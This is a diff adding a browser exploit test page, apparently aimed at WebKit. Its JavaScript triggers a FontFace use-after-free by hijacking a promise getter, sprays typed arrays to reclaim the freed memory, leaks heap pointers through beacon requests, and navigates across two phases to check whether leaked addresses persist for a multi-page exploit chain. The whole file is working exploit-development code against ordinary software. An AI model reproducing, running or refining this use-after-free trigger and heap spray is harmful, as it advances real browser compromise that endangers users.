@@ -1,0 +1,119 @@
+<!--
+  p584: WebProcess persistence test across navigation.
+
+  Phase 1 (no query param): triggers FontFace UAF, reads T, navigates
+  to self with ?phase=2&t1=<T_hex> after 2s.
+
+  Phase 2 (?phase=2): triggers a SECOND FontFace UAF, reads T2,
+  compares with T1 from the URL. If T1 ≈ T2 (same upper bits,
+  delta < 4KB), the WebProcess persisted — heap addresses are stable
+  across navigation and the two-page bridge is viable.
+
+  Does NOT require localStorage (uses URL params only).
+  Uses safety fields on both phases for survival.
+
+  Expected beacons:
+    P1-START        = phase 1 begin
+    P1-F            = phase 1 font freed
+    P1-S<n>         = phase 1 spray done
+    P1-H<i>,T=<hex> = phase 1 hit
+    P1-NAV          = navigating to phase 2
+    P2-START        = phase 2 begin
+    P2-F            = phase 2 font freed
+    P2-S<n>         = phase 2 spray done
+    P2-H<i>,T=<hex> = phase 2 hit
+    P2-CMP,T1=<hex>,T2=<hex>,delta=<n> = comparison
+    P2-VERDICT=<PERSISTED|RESTARTED|AMBIGUOUS>
+    P2-MISS         = phase 2 no hit (cold boot law?)
+    P2-ALIVE        = survival
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+var qs=window.location.search||'';
+var phase=(qs.indexOf('phase=2')>=0)?2:1;
+var t1param='';
+if(phase===2){var m=qs.match(/t1=([0-9a-f]+)/i);if(m)t1param=m[1];}
+
+function triggerUAF(tag,cb){
+  b(tag+'START');
+  var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(pa);void pa.loaded;
+  var fired=0;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+  get:function(){if(fired)return;fired=1;
+  var el=document.getElementById('v');
+  if(el)el.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  b(tag+'F');
+  var lane=[];
+  for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+  for(var j=0;j<lane.length;j++){
+    wD(lane[j],0x00,2);
+    wD(lane[j],0x60,0);
+    wD(lane[j],0x64,0xFFFFFFFF);
+    lane[j][0x82]=3;
+  }
+  b(tag+'S'+lane.length);
+  window._l=lane;
+  return;},set:function(){}});
+  document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+  setTimeout(function(){
+    var lane=window._l;if(!lane){cb(null);return;}
+    for(var i=0;i<lane.length;i++){
+      var v=lane[i],rc=rD(v,0);
+      var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+      if(rc!==2||t0){
+        var T=rQ(v,0x58);
+        b(tag+'H'+i+',rc='+rD(v,0)+',T='+T+',W='+rQ(v,0x68));
+        cb(T);return;
+      }
+    }
+    b(tag+'MISS');cb(null);
+  },80);
+}
+
+function main(){
+  if(phase===1){
+    triggerUAF('P1-',function(T){
+      if(!T)return;
+      setTimeout(function(){
+        b('P1-NAV');
+        window.location='/?phase=2&t1='+T;
+      },2000);
+    });
+  } else {
+    triggerUAF('P2-',function(T2){
+      if(!T2){
+        b('P2-NOHIT,T1='+t1param);
+        b('P2-VERDICT=AMBIGUOUS');
+        return;
+      }
+      // Compare T1 and T2
+      var hi1=t1param.substring(0,10);
+      var hi2=T2.substring(0,10);
+      var lo1=parseInt(t1param.substring(8,16),16);
+      var lo2=parseInt(T2.substring(8,16),16);
+      var delta=Math.abs(lo2-lo1);
+      b('P2-CMP,T1='+t1param+',T2='+T2+',delta='+delta);
+      var verdict;
+      if(hi1===hi2&&delta<4096)verdict='PERSISTED';
+      else if(hi1===hi2&&delta<65536)verdict='SAME_CLUSTER';
+      else verdict='RESTARTED';
+      b('P2-VERDICT='+verdict);
+      setTimeout(function(){b('P2-ALIVE');},500);
+      setTimeout(function(){b('P2-ALIVE2');},2000);
+    });
+  }
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
